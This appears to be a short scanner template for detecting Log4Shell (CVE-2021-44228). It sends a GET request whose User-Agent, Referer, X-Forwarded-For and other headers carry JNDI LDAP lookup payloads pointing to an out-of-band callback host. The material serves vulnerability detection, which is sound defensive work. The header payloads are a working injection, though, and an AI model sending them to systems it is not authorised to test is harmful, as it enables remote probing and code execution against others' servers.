id: cve-2021-44228-log4shell
brief:
  title: Log4Shell (CVE-2021-44228) RCE
  by: sxsc
  level: critical
  about: Detects Log4Shell by injecting JNDI lookup strings in common headers and parameters.
  label:
    - cve
    - log4j
    - rce
    - java
  score: "10.0 CRITICAL"
moves:
  - verb: GET
    to:
      - "{{BaseURL}}/"
    head:
      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
      X-Forwarded-For: "${jndi:ldap://{{interactsh-url}}/b}"
      X-Real-IP: "${jndi:ldap://{{interactsh-url}}/c}"
      Referer: "${jndi:ldap://{{interactsh-url}}/d}"
      X-Api-Version: "${jndi:ldap://{{interactsh-url}}/e}"
      Accept: "${jndi:ldap://{{interactsh-url}}/f}"
    signs:
      - on: word
        has:
          - "interactsh"
        in: all
